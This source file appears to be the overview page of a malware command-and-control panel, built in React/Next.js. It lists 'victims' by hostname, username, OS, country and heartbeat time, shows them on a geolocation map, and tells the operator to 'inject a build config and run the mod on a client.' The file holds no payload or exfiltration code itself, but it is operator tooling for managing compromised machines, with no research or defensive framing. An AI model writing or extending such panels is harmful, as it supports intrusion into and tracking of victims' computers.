'use client';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useApi } from '@/hooks/useApi';
import { useLiveContext } from '@/components/live-provider';
import { Counters } from '@/components/counters';
import { WorldMap } from '@/components/world-map';
import { EventFeed } from '@/components/event-feed';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Empty, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { Topbar } from '@/components/topbar';
import type { Dashboard, Victim } from '@/lib/types';
import { ago, flag, osTone } from '@/lib/format';

export default function DashboardPage() {
  const router = useRouter();
  const dashboard = useApi<Dashboard>('/dashboard', { pollMs: 10_000 });
  const recent = useApi<{ items: Victim[] }>('/victims?limit=8', { pollMs: 10_000 });
  const { events } = useLiveContext();

  return (
    <>
      <Topbar title="Overview" subtitle={`${events.length} live events this session`} />
      <div className="space-y-3 pt-3">
        <Counters data={dashboard.data} loading={dashboard.loading} />

        <div className="grid grid-cols-[1fr_360px] gap-3">
          <Card className="overflow-hidden">
            <CardHeader>
              <CardTitle>Geolocation</CardTitle>
              <span className="font-mono text-2xs text-muted">heartbeat · 20s refresh</span>
            </CardHeader>
            <WorldMap onSelect={(point) => router.push(`/victims/${point.id}`)} />
          </Card>

          <div className="space-y-3">
            <Card>
              <CardHeader><CardTitle>OS mix</CardTitle></CardHeader>
              <CardContent className="space-y-2">
                {(dashboard.data?.byOs ?? []).length === 0 ? <p className="text-xs text-muted">No data</p> : null}
                {(dashboard.data?.byOs ?? []).map((row) => {
                  const total = dashboard.data?.counters.total || 1;
                  return (
                    <div key={row.os}>
                      <div className="mb-1 flex justify-between text-2xs"><span className={osTone(row.os)}>{row.os}</span><span className="num text-muted">{row.count}</span></div>
                      <div className="h-1 rounded bg-line"><div className="h-1 rounded bg-brand" style={{ width: `${(row.count / total) * 100}%` }} /></div>
                    </div>
                  );
                })}
              </CardContent>
            </Card>
            <Card>
              <CardHeader><CardTitle>Top countries</CardTitle></CardHeader>
              <CardContent className="space-y-1">
                {(dashboard.data?.byCountry ?? []).map((row) => (
                  <div key={row.country} className="flex justify-between text-xs">
                    <span>{flag(row.country === 'unknown' ? null : row.country)} {row.country}</span>
                    <span className="num text-muted">{row.count}</span>
                  </div>
                ))}
              </CardContent>
            </Card>
          </div>
        </div>

        <div className="grid grid-cols-[1fr_360px] gap-3">
          <Card>
            <CardHeader>
              <CardTitle>Recent victims</CardTitle>
              <Link href="/victims" className="text-2xs text-brand">all victims →</Link>
            </CardHeader>
            {recent.loading ? <SkeletonRows rows={6} cols={6} /> : (recent.data?.items ?? []).length === 0 ? <Empty title="No victims yet" hint="Inject a build config and run the mod on a client." /> : (
              <Table>
                <THead><TR><TH>Host</TH><TH>OS</TH><TH>Country</TH><TH>User</TH><TH>Tags</TH><TH>Last seen</TH></TR></THead>
                <tbody>
                  {recent.data!.items.map((victim) => (
                    <TR key={victim.id} onClick={() => router.push(`/victims/${victim.id}`)} className="cursor-pointer">
                      <TD className="font-mono text-xs text-ink">{victim.hostname}</TD>
                      <TD><Badge tone={victim.online ? 'ok' : 'default'}>{victim.os}</Badge></TD>
                      <TD className="text-muted">{flag(victim.countryCode)} {victim.country ?? '—'}</TD>
                      <TD className="font-mono text-muted">{victim.username}</TD>
                      <TD className="space-x-1">{victim.tags.slice(0, 3).map((tag) => <Badge key={tag}>{tag}</Badge>)}</TD>
                      <TD className="num text-muted">{ago(victim.lastHeartbeatAt)} ago</TD>
                    </TR>
                  ))}
                </tbody>
              </Table>
            )}
          </Card>
          <Card>
            <CardHeader><CardTitle>Live activity</CardTitle></CardHeader>
            <div className="max-h-[420px] overflow-y-auto"><EventFeed /></div>
          </Card>
        </div>
      </div>
    </>
  );
}
